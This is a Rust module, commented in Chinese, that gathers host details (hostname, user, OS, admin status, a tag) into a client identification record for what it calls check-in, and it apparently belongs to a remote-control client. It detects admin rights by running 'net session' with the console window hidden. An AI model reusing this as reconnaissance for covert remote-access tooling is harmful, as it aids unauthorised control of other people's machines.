//! 系统信息收集模块 (轻量版)

use shared::messages::ClientIdentification;

/// 收集系统信息用于上线标识
pub fn collect_system_info() -> ClientIdentification {
    // 获取机器标识 (主机名+用户名+进程ID，确保每个进程有唯一ID)
    let hostname = hostname::get()
        .map(|h| h.to_string_lossy().to_string())
        .unwrap_or_else(|_| "unknown".to_string());
    let username = whoami::username();
    let pid = std::process::id();
    
    // 使用主机名+用户名+进程ID生成唯一ID
    let id = format!("{:x}", md5_hash(&format!("{}-{}-{}", hostname, username, pid)));
    
    // 获取操作系统信息
    let operating_system = get_os_info();
    
    // 判断账户类型
    let account_type = if is_elevated() { "Admin" } else { "User" }.to_string();
    
    ClientIdentification {
        id,
        version: crate::config::VERSION.to_string(),
        operating_system,
        account_type,
        country: "Unknown".to_string(),
        username,
        pc_name: hostname,
        tag: crate::config::TAG.to_string(),
    }
}

/// 获取操作系统信息
#[cfg(windows)]
fn get_os_info() -> String {
    // 使用 whoami 库获取平台信息，避免调用可能阻塞的 wmic
    let platform = whoami::platform();
    let arch = whoami::arch();
    format!("{:?} {}", platform, arch)
}

#[cfg(not(windows))]
fn get_os_info() -> String {
    use std::process::Command;
    
    // 尝试读取 /etc/os-release
    if let Ok(content) = std::fs::read_to_string("/etc/os-release") {
        for line in content.lines() {
            if line.starts_with("PRETTY_NAME=") {
                return line
                    .trim_start_matches("PRETTY_NAME=")
                    .trim_matches('"')
                    .to_string();
            }
        }
    }
    
    // Fallback: uname -sr
    if let Ok(output) = Command::new("uname").args(["-sr"]).output() {
        return String::from_utf8_lossy(&output.stdout).trim().to_string();
    }
    
    "Unknown".to_string()
}

/// 简单的哈希 (用于生成 ID)
fn md5_hash(input: &str) -> u128 {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    
    let mut hasher = DefaultHasher::new();
    input.hash(&mut hasher);
    let h1 = hasher.finish();
    
    input.chars().rev().collect::<String>().hash(&mut hasher);
    let h2 = hasher.finish();
    
    ((h1 as u128) << 64) | (h2 as u128)
}

/// 检查是否以管理员权限运行
#[cfg(windows)]
fn is_elevated() -> bool {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x08000000;
    
    std::process::Command::new("net")
        .args(["session"])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

#[cfg(not(windows))]
fn is_elevated() -> bool {
    // 简化版：假设非 root
    false
}
